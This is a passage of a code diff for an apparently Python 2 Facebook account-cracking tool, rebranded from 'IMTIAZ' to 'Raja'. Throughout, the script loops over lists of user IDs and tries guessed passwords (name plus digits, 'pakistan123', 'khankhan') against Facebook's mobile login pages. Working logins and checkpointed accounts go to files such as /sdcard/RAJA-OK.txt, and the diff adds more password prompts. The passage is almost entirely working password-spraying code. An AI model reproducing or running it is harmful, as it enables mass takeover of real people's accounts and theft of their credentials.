+                'user-agent': 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]' })
+            p = rana.get('https://mbasic.facebook.com')
+            b = rana.post('https://mbasic.facebook.com/login.php', data = {
+                'email': uid,
+                'pass': pass3,
+                'login': 'submit' })
+            if 'c_user' in rana.cookies.get_dict().keys():
+                print '\x1b[1;92m[RAJA-OK] ' + uid + ' | ' + pass2
+                ok = open('/sdcard/RAJA-OK.txt', 'a')
+                ok.write(uid + ' | ' + pass3 + '\n')
+                ok.close()
+                oks.append(uid + pass3)
+            elif 'checkpoint' in rana.cookies.get_dict().keys():
+                print '\x1b[1;91m[RAJA-CP] ' + uid + ' | ' + pass3
+                cp = open('/sdcard/RAJA-CP.txt', 'a')
+                cp.write(uid + ' | ' + pass3 + '\n')
+                cp.close()
+                cps.append(uid + pass3)
         except:
             pass
 
@@ -4474,10 +3354,10 @@ def c_f_p_pass():
     p.map(main, idx)
     print '\x1b[1;97m'
     print 39 * '-'
-    print '[!] Cloning Complete Result ........'
+    print '[!] cloning complete result ........'
     print 39 * '-'
-    print '[!] total ok ids : ' + str(len(cps))
-    print '[!] total cp ids : ' + str(len(oks))
+    print '[!] total ok ids : ' + str(len(oks))
+    print '[!] total cp ids : ' + str(len(cps))
     print 39 * '-'
     print ''
     raw_input(' Press enter to back ')
@@ -4498,7 +3378,7 @@ def fileauto():
     except:
         print 'file not found'
         time.sleep(2)
-        n_f_p_pass()
+        fileauto()
 
     print '[!] total ids : ' + str(len(idx))
     os.system('echo " -----------------------------------"| lolcat')
@@ -4541,14 +3421,14 @@ def fileauto():
                 'pass': pass1,
                 'login': 'submit' })
             if 'c_user' in rana.cookies.get_dict().keys():
-                print '\x1b[1;92m[IMTIAZ-OK] ' + uid + ' | ' + pass1
-                ok = open('IMTIAZ-ok.txt', 'a')
+                print '\x1b[1;92m[Raja-OK] ' + uid + ' | ' + pass1
+                ok = open('Raja-ok.txt', 'a')
                 ok.write(uid + ' | ' + pass1 + '\n')
                 ok.close()
                 oks.append(uid + pass1)
             elif 'checkpoint' in rana.cookies.get_dict().keys():
-                print '\x1b[1;97m[IMTIAZ-CP] ' + uid + ' | ' + pass1
-                cp = open('IMTIAZ-cp.txt', 'a')
+                print '\x1b[1;91m[Raja-CP] ' + uid + ' | ' + pass1
+                cp = open('Raja-cp.txt', 'a')
                 cp.write(uid + ' | ' + pass1 + '\n')
                 cp.close()
                 cps.append(uid + pass1)
@@ -4570,14 +3450,14 @@ def fileauto():
                     'pass': pass2,
                     'login': 'submit' })
                 if 'c_user' in rana.cookies.get_dict().keys():
-                    print '\x1b[1;92m[IMTIAZ-OK] ' + uid + ' | ' + pass2
-                    ok = open('IMTIAZ-ok.txt', 'a')
+                    print '\x1b[1;92m[Raja-OK] ' + uid + ' | ' + pass2
+                    ok = open('Raja-ok.txt', 'a')
                     ok.write(uid + ' | ' + pass2 + '\n')
                     ok.close()
                     oks.append(uid + pass2)
                 elif 'checkpoint' in rana.cookies.get_dict().keys():
-                    print '\x1b[1;97m[IMTIAZ-CP] ' + uid + ' | ' + pass2
-                    cp = open('IMTIAZ-cp.txt', 'a')
+                    print '\x1b[1;91m[Raja-CP] ' + uid + ' | ' + pass2
+                    cp = open('Raja-cp.txt', 'a')
                     cp.write(uid + ' | ' + pass2 + '\n')
                     cp.close()
                     cps.append(uid + pass2)
@@ -4594,19 +3474,19 @@ def fileauto():
                         'upgrade-insecure-requests': str(random.randint(100, 200)),
                         'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7' })
                     p = rana.get('https://mbasic.facebook.com')
-                    b = rana.post('https://mbasic.facebook.com/login.php', data = {
+                    b = rana.post('https://m.facebook.com/login.php', data = {
                         'email': uid,
                         'pass': pass3,
                         'login': 'submit' })
                     if 'c_user' in rana.cookies.get_dict().keys():
-                        print '\x1b[1;92m[IMTIAZ-OK] ' + uid + ' | ' + pass3
-                        ok = open('IMTIAZ-ok.txt', 'a')
+                        print '\x1b[1;92m[Raja-OK] ' + uid + ' | ' + pass3
+                        ok = open('Raja-ok.txt', 'a')
                         ok.write(uid + ' | ' + pass3 + '\n')
                         ok.close()
                         oks.append(uid + pass3)
                     elif 'checkpoint' in rana.cookies.get_dict().keys():
-                        print '\x1b[1;97m[IMTIAZ-CP] ' + uid + ' | ' + pass3
-                        cp = open('IMTIAZ-cp.txt', 'a')
+                        print '\x1b[1;91m[Raja-CP] ' + uid + ' | ' + pass3
+                        cp = open('Raja-cp.txt', 'a')
                         cp.write(uid + ' | ' + pass3 + '\n')
                         cp.close()
                         cps.append(uid + pass3)
@@ -4622,20 +3502,20 @@ def fileauto():
                             'accept-encoding': 'gzip, deflate',
                             'upgrade-insecure-requests': str(random.randint(100, 200)),
                             'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7' })
-                        p = rana.get('https://mbasic.facebook.com')
+                        p = rana.get('https://m.facebook.com')
                         b = rana.post('https://mbasic.facebook.com/login.php', data = {
                             'email': uid,
                             'pass': pass4,
                             'login': 'submit' })
                         if 'c_user' in rana.cookies.get_dict().keys():
-                            print '\x1b[1;92m[IMTIAZ-OK] ' + uid + ' | ' + pass4
-                            ok = open('IMTIAZ-ok.txt', 'a')
+                            print '\x1b[1;92m[Raja-OK] ' + uid + ' | ' + pass4
+                            ok = open('Raja-ok.txt', 'a')
                             ok.write(uid + ' | ' + pass4 + '\n')
                             ok.close()
                             oks.append(uid + pass4)
                         elif 'checkpoint' in rana.cookies.get_dict().keys():
-                            print '\x1b[1;97m[IMTIAZ-CP] ' + uid + ' | ' + pass4
-                            cp = open('IMTIAZ-cp.txt', 'a')
+                            print '\x1b[1;91m[Raja-CP] ' + uid + ' | ' + pass4
+                            cp = open('Raja-cp.txt', 'a')
                             cp.write(uid + ' | ' + pass4 + '\n')
                             cp.close()
                             cps.append(uid + pass4)
@@ -4652,19 +3532,19 @@ def fileauto():
                                 'upgrade-insecure-requests': str(random.randint(100, 200)),
                                 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7' })
                             p = rana.get('https://mbasic.facebook.com')
-                            b = rana.post('https://mbasic.facebook.com/login.php', data = {
+                            b = rana.post('https://m.facebook.com/login.php', data = {
                                 'email': uid,
                                 'pass': pass5,
                                 'login': 'submit' })
                             if 'c_user' in rana.cookies.get_dict().keys():
-                                print '\x1b[1;92m[IMTIAZ-OK] ' + uid + ' | ' + pass5
-                                ok = open('IMTIAZ-ok.txt', 'a')
+                                print '\x1b[1;92m[Raja-OK] ' + uid + ' | ' + pass5
+                                ok = open('Raja-ok.txt', 'a')
                                 ok.write(uid + ' | ' + pass5 + '\n')
                                 ok.close()
                                 oks.append(uid + pass5)
                             elif 'checkpoint' in rana.cookies.get_dict().keys():
-                                print '\x1b[1;97m[IMTIAZ-CP] ' + uid + ' | ' + pass5
-                                cp = open('IMTIAZ-cp.txt', 'a')
+                                print '\x1b[1;91m[Raja-CP] ' + uid + ' | ' + pass5
+                                cp = open('Raja-cp.txt', 'a')
                                 cp.write(uid + ' | ' + pass5 + '\n')
                                 cp.close()
                                 cps.append(uid + pass5)
@@ -4679,8 +3559,8 @@ def fileauto():
     print 39 * '-'
     print '[!] Cloning Complete Result ........'
     print 39 * '-'
-    print '[!] total ok ids : ' + str(len(cps))
-    print '[!] total cp ids : ' + str(len(oks))
+    print '[!] total ok ids : ' + str(len(oks))
+    print '[!] total cp ids : ' + str(len(cps))
     print 39 * '-'
     print ''
     raw_input(' Press enter to back ')
@@ -4691,12 +3571,18 @@ def n_f_p_pass():
     os.system('clear')
     print logo
     print ''
-    print 'Example 123 + 1234 + 12345 + 786'
+    print 'Example 123 + 1234 + 12345 + 786 + 1122 + 123456 + khankhan + pakistan123 + first last + First Last'
     print ''
     ps1 = raw_input('[1] name + digit : ')
     ps2 = raw_input('[2] name + digit : ')
     ps3 = raw_input('[3] name + digit : ')
     ps4 = raw_input('[4] name + digit : ')
+    ps5 = raw_input('[5] name + digit : ')
+    ps6 = raw_input('[6] name + digit : ')
+    ps7 = raw_input('[7] name + digit : ')
+    ps8 = raw_input('[8] name + digit : ')
+    ps9 = raw_input('[9] name + digit : ')
+    ps10 = raw_input('[10] name + digit : ')
     print ''
     
     try:
@@ -4750,14 +3636,14 @@ def n_f_p_pass():
                 'pass': pass1,
                 'login': 'submit' })
             if 'c_user' in rana.cookies.get_dict().keys():
-                print '\x1b[1;92m[IMTIAZ-OK] ' + uid + ' | ' + pass1
-                ok = open('IMTIAZ-ok.txt', 'a')
+                print '\x1b[1;92m[Raja-OK] ' + uid + ' | ' + pass1
+                ok = open('Raja-ok.txt', 'a')
                 ok.write(uid + ' | ' + pass1 + '\n')
                 ok.close()
                 oks.append(uid + pass1)
             elif 'checkpoint' in rana.cookies.get_dict().keys():
-                print '\x1b[1;91m[IMTIAZ-CP] ' + uid + ' | ' + pass1
-                cp = open('IMTIAZ-cp.txt', 'a')
+                print '\x1b[1;91m[Raja-CP] ' + uid + ' | ' + pass1
+                cp = open('Raja-cp.txt', 'a')
                 cp.write(uid + ' | ' + pass1 + '\n')
                 cp.close()
                 cps.append(uid + pass1)
@@ -4779,14 +3665,14 @@ def n_f_p_pass():
                     'pass': pass2,
                     'login': 'submit' })
                 if 'c_user' in rana.cookies.get_dict().keys():
-                    print '\x1b[1;92m[IMTIAZ-OK] ' + uid + ' | ' + pass2
-                    ok = open('IMTIAZ-ok.txt', 'a')
+                    print '\x1b[1;92m[Raja-OK] ' + uid + ' | ' + pass2
+                    ok = open('Raja-ok.txt', 'a')
                     ok.write(uid + ' | ' + pass2 + '\n')
                     ok.close()
                     oks.append(uid + pass2)
                 elif 'checkpoint' in rana.cookies.get_dict().keys():
-                    print '\x1b[1;91m[IMTIAZ-CP] ' + uid + ' | ' + pass2
-                    cp = open('IMTIAZ-cp.txt', 'a')
+                    print '\x1b[1;91m[Raja-CP] ' + uid + ' | ' + pass2
+                    cp = open('Raja-cp.txt', 'a')
                     cp.write(uid + ' | ' + pass2 + '\n')
                     cp.close()
                     cps.append(uid + pass2)
@@ -4808,14 +3694,14 @@ def n_f_p_pass():
                         'pass': pass3,
                         'login': 'submit' })
                     if 'c_user' in rana.cookies.get_dict().keys():
-                        print '\x1b[1;92m[IMTIAZ-OK] ' + uid + ' | ' + pass3
-                        ok = open('IMTIAZ-ok.txt', 'a')
+                        print '\x1b[1;92m[Raja-OK] ' + uid + ' | ' + pass3
+                        ok = open('Raja-ok.txt', 'a')
                         ok.write(uid + ' | ' + pass3 + '\n')
                         ok.close()
                         oks.append(uid + pass3)
                     elif 'checkpoint' in rana.cookies.get_dict().keys():
-                        print '\x1b[1;91m[IMTIAZ-CP] ' + uid + ' | ' + pass3
-                        cp = open('IMTIAZ-cp.txt', 'a')
+                        print '\x1b[1;91m[Raja-CP] ' + uid + ' | ' + pass3
+                        cp = open('Raja-cp.txt', 'a')
                         cp.write(uid + ' | ' + pass3 + '\n')
                         cp.close()
                         cps.append(uid + pass3)
@@ -4837,14 +3723,14 @@ def n_f_p_pass():
                             'pass': pass4,
                             'login': 'submit' })
                         if 'c_user' in rana.cookies.get_dict().keys():
-                            print '\x1b[1;92m[IMTIAZ-OK] ' + uid + ' | ' + pass4
-                            ok = open('IMTIAZ-ok.txt', 'a')
+                            print '\x1b[1;92m[Raja-OK] ' + uid + ' | ' + pass4
+                            ok = open('Raja-ok.txt', 'a')
                             ok.write(uid + ' | ' + pass4 + '\n')
                             ok.close()
                             oks.append(uid + pass4)
                         elif 'checkpoint' in rana.cookies.get_dict().keys():
-                            print '\x1b[1;91m[IMTIAZ-CP] ' + uid + ' | ' + pass4
-                            cp = open('IMTIAZ-cp.txt', 'a')
+                            print '\x1b[1;91m[Raja-CP] ' + uid + ' | ' + pass4
+                            cp = open('Raja-cp.txt', 'a')
                             cp.write(uid + ' | ' + pass4 + '\n')
                             cp.close()
                             cps.append(uid + pass4)
@@ -4866,14 +3752,14 @@ def n_f_p_pass():
                                 'pass': pass5,
                                 'login': 'submit' })
                             if 'c_user' in rana.cookies.get_dict().keys():
-                                print '\x1b[1;92m[IMYIAZ-OK] ' + uid + ' | ' + pass5
-                                ok = open('IMTIAZ-ok.txt', 'a')
+                                print '\x1b[1;92m[Raja-OK] ' + uid + ' | ' + pass5
+                                ok = open('Raja-ok.txt', 'a')
                                 ok.write(uid + ' | ' + pass5 + '\n')
                                 ok.close()
                                 oks.append(uid + pass5)
                             elif 'checkpoint' in rana.cookies.get_dict().keys():
-                                print '\x1b[1;91m[IMTIAZ-CP] ' + uid + ' | ' + pass5
-                                cp = open('IMTIAZ-cp.txt', 'a')
+                                print '\x1b[1;91m[Raja-CP] ' + uid + ' | ' + pass5
+                                cp = open('Raja-cp.txt', 'a')
                                 cp.write(uid + ' | ' + pass5 + '\n')
                                 cp.close()
                                 cps.append(uid + pass5)
@@ -4951,14 +3837,14 @@ def f_p_pass():
                 'pass': pass1,
                 'login': 'submit' })
             if 'c_user' in rana.cookies.get_dict().keys():
-                print '\x1b[1;92m[IMTIAZ-OK] ' + uid + ' | ' + pass1
-                ok = open('IMTIAZ-ok.txt', 'a')
+                print '\x1b[1;92m[Raja-OK] ' + uid + ' | ' + pass1
+                ok = open('Raja-ok.txt', 'a')
                 ok.write(uid + ' | ' + pass1 + '\n')
                 ok.close()
                 oks.append(uid + pass1)
             elif 'checkpoint' in rana.cookies.get_dict().keys():
-                print '\x1b[1;91m[IMTIAZ-CP] ' + uid + ' | ' + pass1
-                cp = open('IMTIAZ-cp.txt', 'a')
+                print '\x1b[1;91m[Raja-CP] ' + uid + ' | ' + pass1
+                cp = open('Raja-cp.txt', 'a')
                 cp.write(uid + ' | ' + pass1 + '\n')
                 cp.close()
                 cps.append(uid + pass1)
@@ -4980,14 +3866,14 @@ def f_p_pass():
                     'pass': pass2,
                     'login': 'submit' })
                 if 'c_user' in rana.cookies.get_dict().keys():
-                    print '\x1b[1;92m[IMTIAZ-OK] ' + uid + ' | ' + pass2
-                    ok = open('IMTIAZ-ok.txt', 'a')
+                    print '\x1b[1;92m[Raja-OK] ' + uid + ' | ' + pass2
+                    ok = open('Raja-ok.txt', 'a')
                     ok.write(uid + ' | ' + pass2 + '\n')
                     ok.close()
                     oks.append(uid + pass2)
                 elif 'checkpoint' in rana.cookies.get_dict().keys():
-                    print '\x1b[1;91m[IMTIAZ-CP] ' + uid + ' | ' + pass2
-                    cp = open('IMTIAZ-cp.txt', 'a')
+                    print '\x1b[1;91m[Raja-CP] ' + uid + ' | ' + pass2
+                    cp = open('Raja-cp.txt', 'a')
                     cp.write(uid + ' | ' + pass2 + '\n')
                     cp.close()
                     cps.append(uid + pass2)
@@ -5009,14 +3895,14 @@ def f_p_pass():
                         'pass': pass3,
                         'login': 'submit' })
                     if 'c_user' in rana.cookies.get_dict().keys():
-                        print '\x1b[1;92m[IMTIAZ-OK] ' + uid + ' | ' + pass3
-                        ok = open('IMTIAZ-ok.txt', 'a')
+                        print '\x1b[1;92m[Raja-OK] ' + uid + ' | ' + pass3
+                        ok = open('Rsja-ok.txt', 'a')
                         ok.write(uid + ' | ' + pass3 + '\n')
                         ok.close()
                         oks.append(uid + pass3)
                     elif 'checkpoint' in rana.cookies.get_dict().keys():
-                        print '\x1b[1;91m[IMTIAZ-CP] ' + uid + ' | ' + pass3
-                        cp = open('IMTIAZ-cp.txt', 'a')
+                        print '\x1b[1;91m[Raja-CP] ' + uid + ' | ' + pass3
+                        cp = open('Raja-cp.txt', 'a')
                         cp.write(uid + ' | ' + pass3 + '\n')
                         cp.close()
                         cps.append(uid + pass3)
@@ -5038,14 +3924,14 @@ def f_p_pass():
                             'pass': pass4,
                             'login': 'submit' })
                         if 'c_user' in rana.cookies.get_dict().keys():
-                            print '\x1b[1;92m[IMTIAZ-OK] ' + uid + ' | ' + pass4
-                            ok = open('IMTIAZ-ok.txt', 'a')
+                            print '\x1b[1;92m[Raja-OK] ' + uid + ' | ' + pass4
+                            ok = open('Raja-ok.txt', 'a')
                             ok.write(uid + ' | ' + pass4 + '\n')
                             ok.close()
                             oks.append(uid + pass4)
                         elif 'checkpoint' in rana.cookies.get_dict().keys():
-                            print '\x1b[1;91m[IMTIAZ-CP] ' + uid + ' | ' + pass4
-                            cp = open('IMTIAZ-cp.txt', 'a')
+                            print '\x1b[1;91m[Raja-CP] ' + uid + ' | ' + pass4
+                            cp = open('Raja-cp.txt', 'a')
                             cp.write(uid + ' | ' + pass4 + '\n')
                             cp.close()
                             cps.append(uid + pass4)
@@ -5067,14 +3953,14 @@ def f_p_pass():
                                 'pass': pass5,
                                 'login': 'submit' })
                             if 'c_user' in rana.cookies.get_dict().keys():
-                                print '\x1b[1;92m[IMTIAZ-OK] ' + uid + ' | ' + pass5
-                                ok = open('IMTIAZ-ok.txt', 'a')
+                                print '\x1b[1;92m[Raja-OK] ' + uid + ' | ' + pass5
+                                ok = open('Raja-ok.txt', 'a')
                                 ok.write(uid + ' | ' + pass5 + '\n')
                                 ok.close()
                                 oks.append(uid + pass5)
                             elif 'checkpoint' in rana.cookies.get_dict().keys():
-                                print '\x1b[1;91m[IMTIAZ-CP] ' + uid + ' | ' + pass5
-                                cp = open('IMTIAZ-cp.txt', 'a')
+                                print '\x1b[1;91m[Raja-CP] ' + uid + ' | ' + pass5
+                                cp = open('Raja-cp.txt', 'a')
                                 cp.write(uid + ' | ' + pass5 + '\n')
                                 cp.close()
                                 cps.append(uid + pass5)
@@ -5096,14 +3982,14 @@ def f_p_pass():
                                     'pass': pass6,
                                     'login': 'submit' })
                                 if 'c_user' in rana.cookies.get_dict().keys():
-                                    print '\x1b[1;92m[IMTIAZ-OK] ' + uid + ' | ' + pass6
-                                    ok = open('IMTISZ-ok.txt', 'a')
+                                    print '\x1b[1;92m[Raja-OK] ' + uid + ' | ' + pass6
+                                    ok = open('Raja-ok.txt', 'a')
                                     ok.write(uid + ' | ' + pass6 + '\n')
                                     ok.close()
                                     oks.append(uid + pass6)
                                 elif 'checkpoint' in rana.cookies.get_dict().keys():
-                                    print '\x1b[1;91m[IMTIAZ-CP] ' + uid + ' | ' + pass6
-                                    cp = open('IMTIAZ-cp.txt', 'a')
+                                    print '\x1b[1;91m[Raja-CP] ' + uid + ' | ' + pass6
+                                    cp = open('Raja-cp.txt', 'a')
                                     cp.write(uid + ' | ' + pass6 + '\n')
                                     cp.close()
                                     cps.append(uid + pass6)
